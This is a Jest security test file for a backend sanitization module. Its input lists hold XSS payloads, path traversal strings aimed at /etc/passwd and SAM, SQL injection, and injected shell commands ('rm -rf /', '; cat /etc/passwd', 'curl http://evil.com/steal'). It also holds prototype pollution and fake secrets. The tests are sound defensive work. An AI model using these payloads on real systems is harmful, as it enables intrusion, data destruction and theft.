// backend/src/tests/security/sanitize.security.test.ts
import { beforeEach, afterEach, describe, it, expect } from '@jest/globals';
import { Request, Response, NextFunction } from 'express';

// Import the actual sanitization module for security testing
import { sanitization } from '../../utils/sanitize';

describe('Sanitization Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    describe('Script injection attacks', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<script type="text/javascript">alert("xss")</script>',
        '<SCRIPT>alert("xss")</SCRIPT>',
        '<script>document.location="http://evil.com"</script>'
      ];

      xssPayloads.forEach(payload => {
        it(`should remove script tags: ${payload.substring(0, 30)}...`, () => {
          const result = sanitization.sanitizeUserInput(payload);
          
          // Test that HTML tags are removed
          expect(result).not.toContain('<script');
          expect(result).not.toContain('</script>');
          expect(result).not.toMatch(/<script[^>]*>/i);
          expect(typeof result).toBe('string');
        });
      });
    });

    describe('Event handler attacks', () => {
      const eventHandlerPayloads = [
        '<img src="x" onerror="alert(\'xss\')" />',
        '<svg onload="alert(\'xss\')" />',
        '<div onclick="alert(\'xss\')" />',
        'onclick="alert(\'xss\')"'
      ];

      eventHandlerPayloads.forEach(payload => {
        it(`should remove event handlers: ${payload.substring(0, 30)}...`, () => {
          const result = sanitization.sanitizeUserInput(payload);
          
          // Test that event handlers are removed
          expect(result).not.toMatch(/on\w+\s*=/i);
          expect(typeof result).toBe('string');
        });
      });
    });

    describe('Protocol-based attacks', () => {
      const protocolPayloads = [
        'javascript:alert("xss")',
        'JAVASCRIPT:alert("xss")',
        'JaVaScRiPt:alert("xss")',
        'data:text/html,<script>alert("xss")</script>'
      ];

      protocolPayloads.forEach(payload => {
        it(`should remove dangerous protocols: ${payload}`, () => {
          const result = sanitization.sanitizeUserInput(payload);
          
          // Test that dangerous protocols are removed
          expect(result).not.toMatch(/javascript:/i);
          expect(result).not.toMatch(/data:/i);
          expect(typeof result).toBe('string');
        });
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/../../../../etc/shadow',
      '....//....//....//etc/passwd'
    ];

    pathTraversalPayloads.forEach(payload => {
      it(`should prevent path traversal: ${payload}`, () => {
        const result = sanitization.sanitizeFileName(payload);
        
        // Test that path traversal patterns are removed
        expect(result).not.toMatch(/\.\.[\/\\]/);
        expect(result).not.toContain('/etc/');
        expect(result).not.toContain('\\windows\\');
        expect(typeof result).toBe('string');
      });
    });

    it('should prevent path traversal in API path generation', () => {
      const maliciousComponents = [
        '../../../admin',
        '..\\..\\..\\config',
        'normal/../../../etc'
      ];

      maliciousComponents.forEach(component => {
        const result = sanitization.sanitizePath(component, 'resource_123', 'file');
        
        // Test that result is a safe API path
        expect(result).toMatch(/^\/api\/v1\/[a-z0-9\-_]+\/resource_123\/file$/);
        expect(result).not.toContain('../');
        expect(result).not.toContain('..\\');
      });
    });
  });

  describe('Input Validation and Filtering', () => {
    it('should handle non-string inputs safely', () => {
      const invalidInputs = [null, undefined, 123, {}, [], true];
      
      invalidInputs.forEach(input => {
        const result = sanitization.sanitizeUserInput(input as any);
        expect(result).toBe('');
        expect(typeof result).toBe('string');
      });
    });

    it('should preserve safe content while removing dangerous elements', () => {
      const mixedContent = 'Safe text <script>dangerous()</script> more safe text';
      const result = sanitization.sanitizeUserInput(mixedContent);
      
      expect(result).toContain('Safe text');
      expect(result).toContain('more safe text');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should normalize whitespace correctly', () => {
      const messyInput = 'Text   with\n\nmultiple\t\tspaces';
      const result = sanitization.sanitizeUserInput(messyInput);
      
      expect(result).toBe('Text with multiple spaces');
    });
  });

  describe('Header Security', () => {
    it('should only allow whitelisted headers', () => {
      const maliciousHeaders = {
        'User-Agent': 'Mozilla/5.0',
        'X-Dangerous-Header': 'malicious value',
        'Accept': 'application/json',
        'X-Injection': 'script content'
      };

      const result = sanitization.sanitizeHeaders(maliciousHeaders);
      
      // Should only contain whitelisted headers
      expect(result).toHaveProperty('user-agent');
      expect(result).toHaveProperty('accept');
      expect(result).not.toHaveProperty('x-dangerous-header');
      expect(result).not.toHaveProperty('x-injection');
    });

    it('should sanitize header values', () => {
      const headersWithMaliciousValues = {
        'User-Agent': 'Mozilla/5.0 <script>alert("header")</script>',
        'Accept': 'application/json; malicious content'
      };

      const result = sanitization.sanitizeHeaders(headersWithMaliciousValues);
      
      if (result['user-agent']) {
        expect(result['user-agent']).not.toContain('<script>');
      }
      if (result['accept']) {
        expect(result['accept']).toBeDefined();
      }
    });

    it('should limit header value lengths', () => {
      const longHeaders = {
        'User-Agent': 'Very long user agent string. '.repeat(100)
      };

      const result = sanitization.sanitizeHeaders(longHeaders);
      
      if (result['user-agent']) {
        expect(result['user-agent'].length).toBeLessThanOrEqual(500);
      }
    });
  });

  describe('File Upload Security', () => {
    it('should sanitize malicious filenames', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        'normal.jpg<script>alert("filename")</script>',
        'file.txt:alternate_stream',
        'very_long_filename_' + 'a'.repeat(500) + '.txt'
      ];

      maliciousFilenames.forEach(filename => {
        const result = sanitization.sanitizeFileName(filename);
        
        expect(result).not.toMatch(/\.\.[\/\\]/);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain(':');
        expect(result.length).toBeLessThanOrEqual(255);
      });
    });

    it('should handle special Windows reserved names', () => {
      const reservedNames = ['CON.txt', 'PRN.jpg', 'AUX.png'];
      
      reservedNames.forEach(filename => {
        const result = sanitization.sanitizeFileName(filename);
        // The actual implementation may or may not handle this
        expect(typeof result).toBe('string');
        expect(result.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Denial of Service (DoS) Prevention', () => {
    describe('Large payload handling', () => {
      it('should handle moderately large inputs efficiently', () => {
        const largeInput = 'A'.repeat(10000);
        const startTime = performance.now();
        
        const result = sanitization.sanitizeUserInput(largeInput);
        
        const endTime = performance.now();
        const executionTime = endTime - startTime;
        
        expect(result).toBeDefined();
        expect(typeof result).toBe('string');
        expect(executionTime).toBeLessThan(1000); // Should complete within 1 second
      });

      it('should handle very large inputs without crashing', () => {
        const veryLargeInput = 'B'.repeat(100000);
        
        expect(() => {
          const result = sanitization.sanitizeUserInput(veryLargeInput);
          expect(result).toBeDefined();
        }).not.toThrow();
      });
    });

    it('should handle complex nested objects safely', () => {
      const complexObject = {
        level1: {
          level2: {
            level3: {
              dangerous: '<script>alert("nested")</script>',
              safe: 'clean value'
            }
          }
        }
      };

      // Only test if the function doesn't crash with complex objects
      expect(() => {
        sanitization.sanitizeForSecurity(complexObject);
      }).not.toThrow();
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should prevent sensitive information leakage in error messages', () => {
      const sensitiveErrors = [
        new Error('Database connection failed: postgresql://admin:secret123@prod-db:5432/koutu'),
        new Error('API key invalid: sk-1234567890abcdefghijklmnopqrstuvwxyz'),
        new Error('File not found: /home/user/.secrets/private_key.pem')
      ];

      const createMockNext = (): jest.MockedFunction<NextFunction> => jest.fn();

      sensitiveErrors.forEach(error => {
        const mockNext = createMockNext();
        sanitization.handleError(error, 'Operation failed', mockNext);

        const sanitizedError = mockNext.mock.calls[0][0] as unknown as Error & { statusCode?: number };
        
        // Should use the generic message provided
        expect(sanitizedError.message).toBe('Operation failed');
        expect(sanitizedError.statusCode).toBe(500);
      });
    });

    it('should prevent sensitive data exposure in entity responses', () => {
      const entityWithSensitiveData = {
        id: 'entity_123',
        name: 'Public Entity',
        publicField: 'safe data',
        password: 'secret123',
        apiKey: 'sk-abcdef123456'
      };

      const result = sanitization.createSanitizedResponse(
        entityWithSensitiveData,
        ['id', 'name', 'publicField']
      );

      expect(result).toHaveProperty('id');
      expect(result).toHaveProperty('name');
      expect(result).toHaveProperty('publicField');
      expect(result).not.toHaveProperty('password');
      expect(result).not.toHaveProperty('apiKey');
    });
  });

  describe('Edge Case Security Tests', () => {
    it('should handle null byte injection attempts', () => {
      const nullBytePayloads = [
        'file.txt\x00malicious.exe',
        'image.jpg\0<script>alert("null")</script>',
        'normal\x00\x01\x02\x03malicious'
      ];

      nullBytePayloads.forEach(payload => {
        const result = sanitization.sanitizeFileName(payload);
        expect(result).not.toMatch(/\x00/);
        expect(result).not.toMatch(/[\x01-\x1f]/);
        expect(result).not.toContain('<script>');
      });
    });

    it('should handle empty and whitespace-only attacks', () => {
      const whitespaceAttacks = ['', '   ', '\t\t\t', '\n\n\n'];

      whitespaceAttacks.forEach(payload => {
        const result = sanitization.sanitizeUserInput(payload);
        expect(typeof result).toBe('string');
        expect(result.trim()).toBe('');
      });
    });

    it('should handle mixed content attacks', () => {
        const attacks = [
            {
                input: 'Normal text <script>alert("mixed1")</script> more normal text',
                shouldContain: ['Normal text', 'more normal text'],
                shouldNotContain: ['<script>', 'alert']
            },
            {
                input: 'Start javascript:alert("mixed2") middle DROP TABLE users; end',
                shouldContain: ['Start', 'middle', 'end'],
                shouldNotContain: ['javascript:', 'DROP TABLE', 'alert']
            }
        ];
        
        attacks.forEach(({ input, shouldContain, shouldNotContain }) => {
            const result = sanitization.sanitizeUserInput(input);
            shouldContain.forEach(text => expect(result).toContain(text));
            shouldNotContain.forEach(text => expect(result).not.toContain(text));
        });
    });
  });

  describe('Comprehensive Security Scenarios', () => {
    it('should handle complex multi-vector attack', () => {
      const multiVectorAttack = {
        filename: '../../../etc/passwd<script>alert("file")</script>',
        description: 'Normal description javascript:alert("desc"); DROP TABLE images;',
        metadata: {
          type: 'shirt`rm -rf /`',
          color: 'blue<iframe src="javascript:alert(\'color\')"></iframe>',
          tags: [
            'casual',
            '<svg onload="alert(\'tag1\')" />',
            '; cat /etc/passwd |',
            'summer'
          ],
          '__proto__': { isAdmin: true }
        },
        user: {
          email: 'user@example.com<script>document.location="http://evil.com"</script>',
          session: 'abc123; curl http://evil.com/steal'
        }
      };

      const sanitizedFilename = sanitization.sanitizeFileName(multiVectorAttack.filename);
      const sanitizedDescription = sanitization.sanitizeUserInput(multiVectorAttack.description);
      const sanitizedMetadata = sanitization.sanitizeGarmentMetadata(multiVectorAttack.metadata);
      const sanitizedUser = sanitization.sanitizeForSecurity(multiVectorAttack.user);

      // Verify all attack vectors were neutralized
      expect(sanitizedFilename).not.toContain('../');
      expect(sanitizedFilename).not.toContain('<script>');
      
      expect(sanitizedDescription).not.toContain('javascript:');
      expect(sanitizedDescription).not.toContain('DROP TABLE');
      
      expect(sanitizedMetadata.type).not.toContain('rm -rf');
      expect(sanitizedMetadata.color).not.toContain('<iframe');
      expect(sanitizedMetadata.tags).not.toContain('<svg onload="alert(\'tag1\')" />');
      expect(sanitizedMetadata.tags).not.toContain('; cat /etc/passwd |');
      expect(sanitizedMetadata).not.toHaveProperty('__proto__');
      
      expect(sanitizedUser.email).not.toContain('<script>');
      expect(sanitizedUser.session).not.toContain('; curl');
    });
  });
});